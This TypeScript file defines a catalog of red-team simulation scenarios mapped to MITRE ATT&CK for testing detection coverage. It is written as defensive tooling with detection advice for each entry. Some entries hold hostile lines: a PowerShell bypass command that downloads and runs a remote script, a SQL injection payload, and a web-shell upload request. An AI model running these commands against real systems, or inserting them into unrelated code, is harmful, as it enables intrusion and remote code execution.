/**
 * catalog.ts — Catálogo de Escenarios de Simulación de Adversarios (P3.3)
 *
 * Basado en Atomic Red Team. Cada escenario es seguro de ejecutar,
 * no contiene exploits reales. Simula TTPs de MITRE ATT&CK para
 * evaluar la cobertura de detección del stack de seguridad.
 */

export interface AdversaryScenarioDefinition {
  mitreId: string;
  mitreTactic: string;
  mitreTechnique: string;
  name: string;
  description: string;
  detectionAdvice: string;
  severity: "info" | "low" | "medium" | "high" | "critical";
  executorType: "manual" | "powershell" | "bash" | "http";
  executorCommand: string;
  prerequisites: string[];
  tags: string[];
}

export const ADVERSARY_CATALOG: AdversaryScenarioDefinition[] = [
  {
    mitreId: "T1078.001",
    mitreTactic: "TA0001",
    mitreTechnique: "Default Accounts",
    name: "Default Credential Access",
    description:
      "Simula intento de acceso con credenciales por defecto en servicios expuestos (admin:admin, root:root). Evalúa si el sistema detecta autenticaciones fallidas masivas desde una misma IP.",
    detectionAdvice:
      "Monitorear logs de autenticación para múltiples fallos seguidos con usuarios admin/root. Configurar alertas de umbral en SIEM (5+ fallos en 60s).",
    severity: "high",
    executorType: "manual",
    executorCommand:
      'curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$TARGET/admin/ || echo "No accessible"',
    prerequisites: ["Conocimiento de endpoints de administración del objetivo"],
    tags: ["credential-access", "brute-force", "initial-access"],
  },
  {
    mitreId: "T1190",
    mitreTactic: "TA0001",
    mitreTechnique: "Exploit Public-Facing Application",
    name: "Application Vulnerability Probe",
    description:
      "Simula escaneo de vulnerabilidades conocidas en aplicaciones web públicas. Envía payloads de prueba para path traversal, SQLi y XSS reflejado a endpoints comunes.",
    detectionAdvice:
      "WAF/IPS debe detectar patrones de ataque SQLi y XSS. Monitorear 400/500 responses inusuales en logs de aplicación.",
    severity: "critical",
    executorType: "http",
    executorCommand: "GET /?id=1' OR 1=1-- HTTP/1.1",
    prerequisites: ["URL del objetivo"],
    tags: ["web-application", "waf-bypass", "initial-access"],
  },
  {
    mitreId: "T1566.001",
    mitreTactic: "TA0001",
    mitreTechnique: "Spearphishing Attachment",
    name: "Phishing Simulation",
    description:
      "Simula envío de un correo con adjunto malicioso (macro-enabled document). Evalúa si la puerta de enlace de correo detecta y bloquea el adjunto sospechoso.",
    detectionAdvice:
      "Verificar que el gateway de email detecte macros en documentos Office. Comprobar políticas de quarantine automática.",
    severity: "high",
    executorType: "manual",
    executorCommand:
      "Enviar correo de prueba con adjunto .docm a través de plataforma de phishing simulation integrada",
    prerequisites: ["Plataforma de simulación de phishing configurada"],
    tags: ["phishing", "social-engineering", "email-security"],
  },
  {
    mitreId: "T1059.001",
    mitreTactic: "TA0002",
    mitreTechnique: "PowerShell",
    name: "PowerShell Execution Policy Bypass",
    description:
      "Simula ejecución de PowerShell con bypass de política de ejecución para descargar y ejecutar un script remoto. Técnica común en ataques sin archivo (fileless).",
    detectionAdvice:
      "Monitorear Event ID 4104 (Script Block Logging) en Windows Event Log. Alertar sobre PowerShell.exe invocando -EncodedCommand o -ExecutionPolicy Bypass.",
    severity: "high",
    executorType: "powershell",
    executorCommand:
      'powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')"',
    prerequisites: ["Acceso a host Windows objetivo"],
    tags: ["fileless", "living-off-the-land", "execution"],
  },
  {
    mitreId: "T1505.003",
    mitreTactic: "TA0003",
    mitreTechnique: "Web Shell",
    name: "Web Shell Deployment Simulation",
    description:
      "Simula despliegue de un web shell en un servidor web mediante subida de archivo. Evalúa la detección de uploads no autorizados con extensiones peligrosas (.jsp, .asp, .php).",
    detectionAdvice:
      "Monitorear uploads de archivos con extensiones de script en servidores web. Configurar WAF para bloquear .php/.jsp/.asp en endpoints de subida.",
    severity: "critical",
    executorType: "http",
    executorCommand: "POST /upload HTTP/1.1 Content-Type: multipart/form-data [shell.jsp]",
    prerequisites: ["Endpoint de subida de archivos identificado"],
    tags: ["persistence", "web-shell", "file-upload"],
  },
  {
    mitreId: "T1021.001",
    mitreTactic: "TA0008",
    mitreTechnique: "Remote Desktop Protocol",
    name: "RDP Brute Force Simulation",
    description:
      "Simula intento de conexión RDP con credenciales comunes. Evalúa si el firewall perimetral o VPN bloquea conexiones RDP desde IPs no autorizadas.",
    detectionAdvice:
      "Monitorear Event ID 4625 (logon failure) para RDP. Verificar reglas de Network Security Group que restrinjan RDP a IPs autorizadas.",
    severity: "high",
    executorType: "bash",
    executorCommand:
      'nc -zv $TARGET 3389 2>&1 | grep -q succeeded && echo "RDP accessible" || echo "RDP blocked"',
    prerequisites: ["Rango de IPs del objetivo"],
    tags: ["lateral-movement", "rdp", "brute-force"],
  },
  {
    mitreId: "T1110.001",
    mitreTactic: "TA0006",
    mitreTechnique: "Password Guessing",
    name: "Password Spray Attack",
    description:
      "Simula un ataque de password spraying contra un servicio de autenticación (OWA, VPN, SSO). Usa contraseñas comunes contra múltiples usuarios para evitar bloqueos por cuenta.",
    detectionAdvice:
      "Monitorear múltiples intentos fallidos de autenticación para diferentes usuarios desde una misma IP (Event ID 4625). Alertar sobre >10 intentos en 5 minutos.",
    severity: "high",
    executorType: "manual",
    executorCommand:
      "Ejecutar script de password spraying con 5 contraseñas comunes contra lista de 100 usuarios",
    prerequisites: ["Lista de usuarios del dominio objetivo"],
    tags: ["credential-access", "password-spray", "authentication"],
  },
  {
    mitreId: "T1557.001",
    mitreTactic: "TA0007",
    mitreTechnique: "LLMNR/NBT-NS Poisoning",
    name: "LLMNR Poisoning Simulation",
    description:
      "Simula envenenamiento de caché LLMNR para interceptar tráfico de autenticación en redes locales. Evalúa si el segmento de red detecta tráfico anómalo de respuesta LLMNR.",
    detectionAdvice:
      "Monitorear Event ID 4697 (service installation) para servicios de responder-like. Verificar políticas de GPO que deshabiliten LLMNR.",
    severity: "medium",
    executorType: "powershell",
    executorCommand:
      'Get-Service -Name "Responder" -ErrorAction SilentlyContinue | Select-Object Status',
    prerequisites: ["Acceso a red interna del objetivo"],
    tags: ["discovery", "lateral-movement", "credential-theft"],
  },
  {
    mitreId: "T1046",
    mitreTactic: "TA0007",
    mitreTechnique: "Network Service Discovery",
    name: "Network Port Scan",
    description:
      "Simula escaneo de puertos en la red del objetivo para descubrir servicios expuestos. Evalúa si el IDS/IPS detecta y bloquea escaneos de red.",
    detectionAdvice:
      "Monitorear logs de firewall para escaneos de puertos consecutivos. Verificar que el IPS tenga reglas para detectar nmap y masscan.",
    severity: "medium",
    executorType: "bash",
    executorCommand:
      'nmap -sT -p 22,80,443,3389,8443 $TARGET --open -T4 2>/dev/null || echo "nmap not available"',
    prerequisites: ["Herramienta nmap instalada"],
    tags: ["discovery", "reconnaissance", "network-scan"],
  },
  {
    mitreId: "T1003.001",
    mitreTactic: "TA0006",
    mitreTechnique: "LSASS Memory",
    name: "Credential Dumping Simulation",
    description:
      "Simula intento de acceso a memoria LSASS para extraer credenciales. La simulación solo verifica si el proceso LSASS tiene protecciones como PPL (Process Lightweight) habilitadas.",
    detectionAdvice:
      "Monitorear Event ID 4663 (access to LSASS process). Verificar que Windows Defender Credential Guard y LSA Protection estén habilitados.",
    severity: "critical",
    executorType: "powershell",
    executorCommand:
      'Get-Process -Name "Lsass" | Select-Object ProcessName, Id, @{Name="PPL";Expression={(Get-Process -Id $_.Id -IncludeUserName).UserName}}',
    prerequisites: ["Acceso a host Windows objetivo"],
    tags: ["credential-access", "lsass", "mimikatz"],
  },
  {
    mitreId: "T1530",
    mitreTactic: "TA0009",
    mitreTechnique: "Data from Cloud Storage",
    name: "Cloud Storage Data Exfiltration",
    description:
      "Simula intento de acceso a buckets de cloud storage (S3, GCS, Blob) desde una IP externa no autorizada. Evalúa políticas de acceso y detección de exfiltración.",
    detectionAdvice:
      "Monitorear CloudTrail/S3 Access Logs para GetObject desde IPs inusuales. Configurar alertas de descarga masiva (>100 objetos en 5 min).",
    severity: "high",
    executorType: "manual",
    executorCommand: 'aws s3 ls s3://$BUCKET --no-sign-request 2>&1 || echo "Access denied"',
    prerequisites: ["Nombre del bucket objetivo"],
    tags: ["collection", "exfiltration", "cloud-security"],
  },
  {
    mitreId: "T1490",
    mitreTactic: "TA0040",
    mitreTechnique: "Inhibit System Recovery",
    name: "Backup Deletion Simulation",
    description:
      "Simula intento de eliminación de snapshots y backups. Evalúa si el sistema de backup y Monitoreo detectan eliminación masiva de snapshots/backups.",
    detectionAdvice:
      "Monitorear eliminación de snapshots en cloud providers. Configurar alerts para DeleteSnapshot/DeleteBackup actions en CloudTrail.",
    severity: "critical",
    executorType: "manual",
    executorCommand:
      "Verificar políticas de backup: retention lock, MFA delete, y versioning habilitados",
    prerequisites: ["Acceso a consola cloud del objetivo"],
    tags: ["impact", "ransomware", "backup-deletion"],
  },
];

export function getScenarioByMitreId(
  mitreId: string
): AdversaryScenarioDefinition | undefined {
  return ADVERSARY_CATALOG.find((s) => s.mitreId === mitreId);
}

export function getScenariosByTactic(
  tactic: string
): AdversaryScenarioDefinition[] {
  return ADVERSARY_CATALOG.filter((s) => s.mitreTactic === tactic);
}

export function getScenariosBySeverity(
  severity: string
): AdversaryScenarioDefinition[] {
  return ADVERSARY_CATALOG.filter((s) => s.severity === severity);
}
